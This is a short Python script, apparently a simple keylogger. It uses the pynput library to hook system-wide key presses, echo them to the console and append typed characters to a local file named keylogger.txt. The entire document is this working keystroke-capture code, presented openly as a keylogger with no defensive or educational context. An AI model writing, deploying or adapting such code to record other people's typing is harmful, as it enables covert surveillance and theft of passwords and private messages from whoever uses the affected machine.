from pynput import keyboard

def character(key):
    print(str(key))
    with open("keylogger.txt",'a') as keylog:
        try:
            char=key.char
            keylog.write(char)
        except:
            print("error getting the KEY ")



if __name__ == "__main__":
    listener=keyboard.Listener(on_press=character)
    listener.start()
    input()